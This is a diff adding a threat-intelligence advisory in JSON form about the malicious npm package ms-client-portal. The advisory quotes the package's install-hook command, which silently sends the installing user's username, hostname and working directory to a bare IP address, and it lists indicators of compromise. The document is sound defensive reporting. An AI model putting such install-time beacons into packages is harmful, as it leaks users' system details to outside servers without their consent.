@@ -1,0 +1,65 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-13505",
+  "modified": "2026-10-31T13:35:57Z",
+  "published": "2026-10-31T13:35:24Z",
+  "summary": "Malicious code in ms-client-portal (npm)",
+  "details": "Package ships only package.json and README.md (no index.js despite a \"main\" field) but declares preinstall and postinstall lifecycle hooks that execute an inline Node.js command on install: `node -e \"require('http').get('hxxp://38[.]242[.]235[.]206/depconf/ms-client-portal/preinstall?u=\u003cUSERNAME\u003e\u0026h=\u003chostname\u003e\u0026p=\u003ccwd\u003e')\"`, with the same GET repeated for the /postinstall path. Both requests send the installing user's username (process.env.USER or USERNAME), machine hostname and working directory over plain HTTP to a bare IP address, and swallow errors so the install appears normal. No payload is fetched or executed and no files are read. The name corresponds to an internal project name; the package describes itself as a \"defensive placeholder\" whose install scripts send a single GET to a researcher server. Callback beacon endpoints: hxxp://38[.]242[.]235[.]206/depconf/ms-client-portal/preinstall and hxxp://38[.]242[.]235[.]206/depconf/ms-client-portal/postinstall.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "ms-client-portal",
+        "purl": "pkg:npm/ms-client-portal"
+      },
+      "versions": [
+        "1.0.0"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ]
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/ms-client-portal/v/1.0.0"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-13505"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-10-31T13:35:24Z",
+      "indicators_observed": {
+        "ip_observed": [
+          "38[.]242[.]235[.]206"
+        ],
+        "sha256": [
+          "0b76dcfbde0dcaf2736dbe591ae92233c6626020fa062a04357d7d38b6c0365f"
+        ],
+        "url_observed": [
+          "hxxp://38[.]242[.]235[.]206/depconf/ms-client-portal/postinstall",
+          "hxxp://38[.]242[.]235[.]206/depconf/ms-client-portal/preinstall"
+        ]
+      }
+    }
+  }
+}
